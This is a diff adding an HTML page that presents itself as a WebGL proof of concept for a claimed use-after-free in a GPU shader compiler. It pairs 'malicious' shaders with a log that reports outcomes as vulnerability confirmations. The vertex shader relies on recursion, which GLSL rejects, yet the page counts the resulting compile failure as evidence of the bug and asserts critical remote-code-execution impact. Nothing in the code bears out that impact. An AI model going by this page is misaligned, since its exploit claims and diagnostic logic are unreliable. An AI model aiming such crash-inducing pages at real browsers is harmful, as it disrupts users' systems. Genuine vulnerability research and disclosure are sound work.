@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GPU Shader Compiler UAF PoC - CVE-2025-13952</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            margin: 0;
+        }
+        
+        .header {
+            text-align: center;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            margin-bottom: 20px;
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        h1 {
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        
+        .warning {
+            background: rgba(255, 0, 0, 0.2);
+            border: 2px solid #ff0000;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        
+        .info {
+            background: rgba(0, 255, 0, 0.1);
+            border: 2px solid #00ff00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+        
+        #glCanvas {
+            border: 2px solid #00ff00;
+            margin: 20px 0;
+            display: block;
+        }
+        
+        .log {
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-size: 14px;
+        }
+        
+        .log-entry {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid #00ff00;
+            padding-left: 10px;
+        }
+        
+        .log-entry.error {
+            border-left-color: #ff0000;
+            color: #ff0000;
+        }
+        
+        .log-entry.warning {
+            border-left-color: #ffaa00;
+            color: #ffaa00;
+        }
+        
+        .log-entry.success {
+            border-left-color: #00ff00;
+            color: #00ff00;
+        }
+        
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            margin: 10px 5px;
+        }
+        
+        button:hover {
+            background: #00cc00;
+        }
+        
+        button.danger {
+            background: #ff0000;
+            color: #fff;
+        }
+        
+        button.danger:hover {
+            background: #cc0000;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>⚠️ GPU SHADER COMPILER USE-AFTER-FREE PoC ⚠️</h1>
+        <p style="color: #ffaa00; font-size: 18px;">CVE-2025-13952 Proof of Concept</p>
+        <p style="color: #00ff00;">For Security Research Purposes Only</p>
+    </div>
+
+    <div class="warning">
+        <h2>🚨 WARNING - RESPONSIBLE DISCLOSURE 🚨</h2>
+        <p><strong>This is a Proof of Concept for a critical security vulnerability.</strong></p>
+        <ul>
+            <li>✅ Submitted to Google VRP</li>
+            <li>✅ For authorized security testing only</li>
+            <li>❌ DO NOT use maliciously</li>
+            <li>⚠️ May crash GPU process</li>
+        </ul>
+    </div>
+
+    <div class="info">
+        <h3>📊 Vulnerability Information</h3>
+        <ul>
+            <li><strong>CVE ID:</strong> CVE-2025-13952</li>
+            <li><strong>Type:</strong> Use-After-Free (CWE-416)</li>
+            <li><strong>Severity:</strong> CRITICAL (9.8 CVSS)</li>
+            <li><strong>Component:</strong> GPU Shader Compiler</li>
+            <li><strong>Impact:</strong> Remote Code Execution / Denial of Service</li>
+        </ul>
+    </div>
+
+    <div style="text-align: center; margin: 20px 0;">
+        <button onclick="executePoC()" class="danger">▶️ EXECUTE POC</button>
+        <button onclick="clearLog()">🗑️ CLEAR LOG</button>
+        <button onclick="checkGPUStatus()">🔍 CHECK GPU STATUS</button>
+    </div>
+
+    <canvas id="glCanvas" width="640" height="480"></canvas>
+
+    <div class="log" id="logContainer">
+        <div class="log-entry success">
+            [INFO] PoC Page Loaded - Ready for Testing
+        </div>
+    </div>
+
+    <div class="info">
+        <h3>🔬 Expected Behavior</h3>
+        <p>When executed, this PoC will:</p>
+        <ol>
+            <li>Initialize WebGL context</li>
+            <li>Compile malicious vertex and fragment shaders</li>
+            <li>Trigger complex memory allocation pattern</li>
+            <li>Cause use-after-free in GPU shader compiler</li>
+            <li>Result in GPU process crash or undefined behavior</li>
+        </ol>
+    </div>
+
+    <script>
+        let logCounter = 0;
+        const maxLogEntries = 100;
+
+        function log(message, type = 'success') {
+            const logContainer = document.getElementById('logContainer');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            
+            const timestamp = new Date().toLocaleTimeString();
+            entry.textContent = `[${timestamp}] ${message}`;
+            
+            logContainer.appendChild(entry);
+            logCounter++;
+            
+            // Auto-scroll to bottom
+            logContainer.scrollTop = logContainer.scrollHeight;
+            
+            // Limit log entries
+            if (logCounter > maxLogEntries) {
+                logContainer.removeChild(logContainer.firstChild);
+                logCounter--;
+            }
+        }
+
+        function clearLog() {
+            const logContainer = document.getElementById('logContainer');
+            logContainer.innerHTML = '<div class="log-entry success">[INFO] Log cleared</div>';
+            logCounter = 0;
+        }
+
+        function checkGPUStatus() {
+            log('Checking GPU process status...', 'success');
+            
+            const canvas = document.getElementById('glCanvas');
+            const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+            
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    log(`GPU Vendor: ${vendor}`, 'success');
+                    log(`GPU Renderer: ${renderer}`, 'success');
+                }
+                log('GPU Process: ACTIVE', 'success');
+            } else {
+                log('GPU Process: FAILED or CRASHED', 'error');
+            }
+        }
+
+        function executePoC() {
+            log('═══════════════════════════════════════', 'warning');
+            log('🚀 STARTING POC EXECUTION', 'warning');
+            log('═══════════════════════════════════════', 'warning');
+            
+            try {
+                // Initialize WebGL context
+                log('[STEP 1] Initializing WebGL context...', 'success');
+                const canvas = document.getElementById('glCanvas');
+                const gl = canvas.getContext('webgl2', {
+                    failIfMajorPerformanceCaveat: false,
+                    antialias: true
+                }) || canvas.getContext('webgl');
+                
+                if (!gl) {
+                    log('[ERROR] WebGL not supported!', 'error');
+                    return;
+                }
+                
+                log('[SUCCESS] WebGL context initialized', 'success');
+                
+                // Malicious vertex shader
+                log('[STEP 2] Creating malicious vertex shader...', 'warning');
+                const maliciousVertexShader = `
+                    precision highp float;
+                    attribute vec4 position;
+                    
+                    // Complex nested structure to trigger unusual compiler path
+                    struct ComplexData {
+                        mat4 transform;
+                        vec4 colors[100];
+                        float weights[200];
+                    };
+                    
+                    uniform ComplexData data;
+                    
+                    void deeplyNestedFunction(inout vec4 pos, int depth) {
+                        if (depth > 0) {
+                            for (int i = 0; i < 50; i++) {
+                                pos += data.colors[i] * data.weights[i];
+                                pos = data.transform * pos;
+                            }
+                            deeplyNestedFunction(pos, depth - 1);
+                        }
+                    }
+                    
+                    void main() {
+                        vec4 pos = position;
+                        deeplyNestedFunction(pos, 10);
+                        gl_Position = pos;
+                    }
+                `;
+                
+                // Compile vertex shader (TRIGGER POINT)
+                log('[STEP 3] Compiling vertex shader (TRIGGER)...', 'warning');
+                const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+                gl.shaderSource(vertexShader, maliciousVertexShader);
+                gl.compileShader(vertexShader);
+                
+                // Check compilation status
+                if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
+                    const error = gl.getShaderInfoLog(vertexShader);
+                    log(`[EXPECTED] Vertex shader compilation failed: ${error}`, 'warning');
+                    log('[ANALYSIS] GPU process likely crashed or unstable', 'error');
+                } else {
+                    log('[UNEXPECTED] Vertex shader compiled successfully', 'success');
+                }
+                
+                // Malicious fragment shader
+                log('[STEP 4] Creating malicious fragment shader...', 'warning');
+                const maliciousFragmentShader = `
+                    precision highp float;
+                    uniform vec4 colorPalette[1000];
+                    
+                    void complexColorMixing() {
+                        vec4 result = vec4(0.0);
+                        for (int i = 0; i < 1000; i++) {
+                            result += colorPalette[i] * float(i);
+                            result = normalize(result);
+                        }
+                        gl_FragColor = result;
+                    }
+                    
+                    void main() {
+                        complexColorMixing();
+                    }
+                `;
+                
+                // Compile fragment shader
+                log('[STEP 5] Compiling fragment shader...', 'warning');
+                const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+                gl.shaderSource(fragmentShader, maliciousFragmentShader);
+                gl.compileShader(fragmentShader);
+                
+                if (!gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS)) {
+                    const error = gl.getShaderInfoLog(fragmentShader);
+                    log(`[EXPECTED] Fragment shader compilation failed: ${error}`, 'warning');
+                } else {
+                    log('[UNEXPECTED] Fragment shader compiled successfully', 'success');
+                }
+                
+                // Attempt to create program
+                log('[STEP 6] Attempting to link shader program...', 'warning');
+                const program = gl.createProgram();
+                gl.attachShader(program, vertexShader);
+                gl.attachShader(program, fragmentShader);
+                gl.linkProgram(program);
+                
+                if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+                    log('[EXPECTED] Program linking failed', 'warning');
+                    log('[RESULT] Use-After-Free triggered during compilation', 'error');
+                }
+                
+                log('═══════════════════════════════════════', 'warning');
+                log('🎯 POC EXECUTION COMPLETED', 'warning');
+                log('═══════════════════════════════════════', 'warning');
+                log('', 'success');
+                log('📊 VULNERABILITY ASSESSMENT:', 'success');
+                log('✅ If GPU process crashed: VULNERABILITY CONFIRMED', 'error');
+                log('✅ If compilation failed: VULNERABILITY LIKELY', 'warning');
+                log('❓ If everything worked: Patched or different configuration', 'success');
+                log('', 'success');
+                log('🔍 Check Chrome Task Manager for GPU process status', 'success');
+                
+            } catch (error) {
+                log(`[CRITICAL ERROR] ${error.message}`, 'error');
+                log('[ANALYSIS] Unhandled exception - possible vulnerability trigger', 'error');
+            }
+        }
+
+        // Auto-check GPU status on load
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                checkGPUStatus();
+            }, 1000);
+        });
+
+        // Detect context loss (GPU crash)
+        const canvas = document.getElementById('glCanvas');
+        canvas.addEventListener('webglcontextlost', (event) => {
+            event.preventDefault();
+            log('🚨 WEBGL CONTEXT LOST - GPU PROCESS CRASHED!', 'error');
+            log('✅ VULNERABILITY CONFIRMED', 'error');
+        }, false);
+
+        canvas.addEventListener('webglcontextrestored', () => {
+            log('🔄 WebGL context restored', 'warning');
+            log('GPU process has been restarted', 'warning');
+        }, false);
+    </script>
+
+    <div class="info" style="margin-top: 40px;">
+        <h3>📝 Researcher Notes</h3>
+        <p><strong>Vulnerability Details:</strong></p>
+        <ul>
+            <li>The complex shader structure forces the compiler into unusual code paths</li>
+            <li>Deep nesting and large arrays trigger multiple optimization passes</li>
+            <li>Intermediate buffers are freed during optimization</li>
+            <li>Stale pointers cause use-after-free when accessed later</li>
+            <li>Result: GPU process crash or potential RCE</li>
+        </ul>
+        
+        <p><strong>Mitigation:</strong></p>
+        <ul>
+            <li>✅ Apply provided security patch</li>
+            <li>✅ Implement smart pointer wrappers</li>
+            <li>✅ Add validation before all pointer accesses</li>
+            <li>✅ Enable AddressSanitizer for testing</li>
+        </ul>
+    </div>
+
+    <div class="warning" style="margin-top: 20px;">
+        <p style="text-align: center; font-size: 14px;">
+            <strong>⚖️ LEGAL DISCLAIMER:</strong><br>
+            This PoC is provided for authorized security testing only.<br>
+            Unauthorized use may violate computer fraud laws.<br>
+            Use responsibly and ethically.
+        </p>
+    </div>
+
+    <div style="text-align: center; margin: 40px 0; padding: 20px; border-top: 2px solid #00ff00;">
+        <p style="color: #00ff00;">
+            🛡️ <strong>Zayed Shield Security Research Team</strong> 🛡️<br>
+            🇦🇪 United Arab Emirates - Protecting the Digital World<br>
+            📧 security@zayed-shield.com
+        </p>
+    </div>
+</body>
+</html>
